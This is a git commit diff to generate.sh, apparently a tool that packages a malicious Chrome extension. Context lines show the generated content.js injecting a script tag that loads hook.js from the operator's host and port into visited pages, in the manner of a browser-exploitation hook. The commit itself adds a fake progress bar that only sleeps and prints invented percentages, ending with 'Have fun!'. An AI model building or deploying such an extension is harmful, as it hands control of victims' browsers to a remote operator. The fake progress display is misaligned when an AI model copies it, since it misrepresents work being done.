101b151d1405c54fce8cbd1e44127f4821e31273
root <root@localhost.localdomain>
2017-02-13 20:44:22 +0100

    loading animation

--- generate.sh
+++ generate.sh
@@ -50,3 +50,24 @@ var hook = document.createElement("script");
 hook.src = "http://'$hostIP':'$port'/hook.js";
 document.head.appendChild(hook);
 ' > content.js
+
+echo "generating .crx"
+
+echo ""
+
+count=0
+total=34
+pstr="[=======================================================================]"
+
+while [ $count -lt $total ]; do
+  sleep 0.05 # this is work
+  count=$(( $count + 1 ))
+  pd=$(( $count * 73 / $total ))
+  printf "\r%3d.%1d%% %.${pd}s" $(( $count * 100 / $total )) $(( ($count * 1000 / $total) % 10 )) $pstr
+done
+
+echo ""
+echo ""
+
+echo "Your extension is created in the directory "$name
+echo "Have fun!"
